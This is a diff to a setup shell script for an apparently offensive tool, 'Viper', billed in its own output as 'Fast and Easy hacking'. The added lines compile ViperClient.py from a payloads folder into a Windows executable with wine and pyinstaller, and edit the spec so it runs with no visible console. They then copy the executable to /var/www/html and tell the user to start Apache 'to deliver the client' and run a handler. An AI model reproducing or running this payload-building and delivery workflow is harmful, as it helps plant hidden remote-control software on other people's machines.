@@ -53,13 +53,33 @@ echo "usage $> python viper.py"
 
 
 #to Convert ViperClient.py to exe run commands below
+echo "generating ViperClient.exe"
 
 # wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile HelloWorld.py
-# wine pyinstaller --onefile --noconsole --nowindowed ViperClient.py
+
+cd payloads/
+wine pyinstaller --onefile --noconsole --nowindowed ViperClient.py
+rm -rf build/
+rm -rf dist/
+sed -i 's/console=True/console=False/g' ViperClient.spec
+wine pyinstaller ViperClient.spec
+cp dist/ViperClient.exe /var/www/html
+cp ViperClient.py /var/www/html
+rm -rf build/
+rm -rf dist/
+cd ../
+
+
+echo "copied ViperClient.exe and ViperClient.py to /var/www/html"
+echo "run start apache2 service to start your server and deliver the client"
+
+echo "usage $> python viper.py"
+echo "Viper $> handler"
+echo "Fast and Easy hacking"
+
 # wine  wine pyinstaller ViperClient.spec
 # modify ViperClient.spec
 # run python ViperClient.spec and change console=True to Console=False
-cd /home/viper-framework
 rm python-2.7.13.msi
 rm python-2.7.13.msi.*
 
